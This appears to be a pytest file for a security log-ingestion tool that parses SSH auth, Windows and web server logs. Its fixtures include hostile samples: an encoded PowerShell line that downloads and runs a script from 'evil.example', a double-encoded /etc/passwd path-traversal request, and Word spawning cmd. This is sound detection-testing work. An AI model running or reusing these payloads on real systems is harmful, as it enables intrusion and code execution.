import base64
import json

from sigilant.ingest import detect_type, linux_auth, web, windows


def test_auth_bsd_and_rfc3339_formats():
    bsd = linux_auth.parse_line("Nov 18 02:10:01 web01 sshd[812]: Failed password for invalid user admin "
                                "from 185.220.101.47 port 51234 ssh2", year=2026)
    assert bsd["@timestamp"].year == 2026 and bsd["event.outcome"] == "failure"
    assert bsd["user.name"] == "admin" and bsd["source.ip"] == "185.220.101.47"
    iso = linux_auth.parse_line("2026-11-18T02:16:05.123456+00:00 web01 sshd[900]: Accepted password for deploy "
                                "from 185.220.101.47 port 4444 ssh2")
    assert iso["event.outcome"] == "success" and iso["host.name"] == "web01"


def test_auth_sudo_and_useradd():
    sudo = linux_auth.parse_line("Nov 18 02:18:00 web01 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; "
                                 "USER=root ; COMMAND=/bin/bash", year=2026)
    assert sudo["event.action"] == "sudo_command" and sudo["process.command_line"] == "/bin/bash"
    assert sudo["user.target.name"] == "root"
    ua = linux_auth.parse_line("Nov 18 02:19:00 web01 useradd[1]: new user: name=sysupdate, UID=1003", year=2026)
    assert ua["event.action"] == "user_created" and ua["user.target.name"] == "sysupdate"


def test_windows_4688_maps_to_sysmon_fields():
    ev = windows.normalise({"TimeCreated": "2026-11-18T09:00:00.1234567Z", "Channel": "Security", "EventID": 4688,
                            "Computer": "WS01.corp.local",
                            "EventData": {"NewProcessName": r"C:\Windows\System32\cmd.exe",
                                          "ParentProcessName": r"C:\x\WINWORD.EXE", "CommandLine": "cmd /c whoami"}})
    assert ev["logsource.category"] == "process_creation"
    assert ev["Image"].endswith("cmd.exe") and ev["ParentImage"].endswith("WINWORD.EXE")
    assert ev["host.name"] == "WS01"


def test_windows_decodes_encoded_powershell():
    payload = base64.b64encode("IEX (iwr http://evil.example/a.ps1)".encode("utf-16-le")).decode()
    ev = windows.normalise({"TimeCreated": "2026-11-18T09:00:00Z", "Channel": "Microsoft-Windows-Sysmon/Operational",
                            "EventID": 1, "Computer": "WS01",
                            "EventData": {"Image": "powershell.exe", "CommandLine": f"powershell -enc {payload}",
                                          "Hashes": "MD5=AA,SHA256=BB"}})
    assert "evil.example" in ev["process.command_line.decoded"]
    assert ev["file.hash.sha256"] == "bb"


def test_windows_powershell51_date_format():
    ev = windows.normalise({"TimeCreated": "/Date(1795000000000)/", "EventID": 1102, "Computer": "WS01",
                            "EventData": {}})
    assert ev["@timestamp"].year >= 2026 and ev["event.action"] == "audit_log_cleared"


def test_web_double_decoding():
    line = ('45.155.205.233 - - [18/Nov/2026:01:27:39 +0000] "GET /d.php?file=%252e%252e%252fetc%252fpasswd '
            'HTTP/1.1" 200 512 "-" "curl/8"')
    ev = web.parse_line(line, "web01")
    assert "../etc/passwd" in ev["url.decoded"] and ev["http.response.status_code"] == 200


def test_detect_type(tmp_path):
    (tmp_path / "a.log").write_text("Nov 18 02:10:01 web01 sshd[1]: Failed password for root from 1.2.3.4 port 1 ssh2\n")
    (tmp_path / "b.log").write_text('1.2.3.4 - - [18/Nov/2026:01:00:00 +0000] "GET / HTTP/1.1" 200 1 "-" "x"\n')
    (tmp_path / "c.jsonl").write_text(json.dumps({"TimeCreated": "2026-11-18T00:00:00Z", "EventID": 1}) + "\n")
    (tmp_path / "d.txt").write_text("hello\n")
    assert [detect_type(tmp_path / n) for n in ("a.log", "b.log", "c.jsonl", "d.txt")] == \
        ["linux_auth", "web", "windows", None]
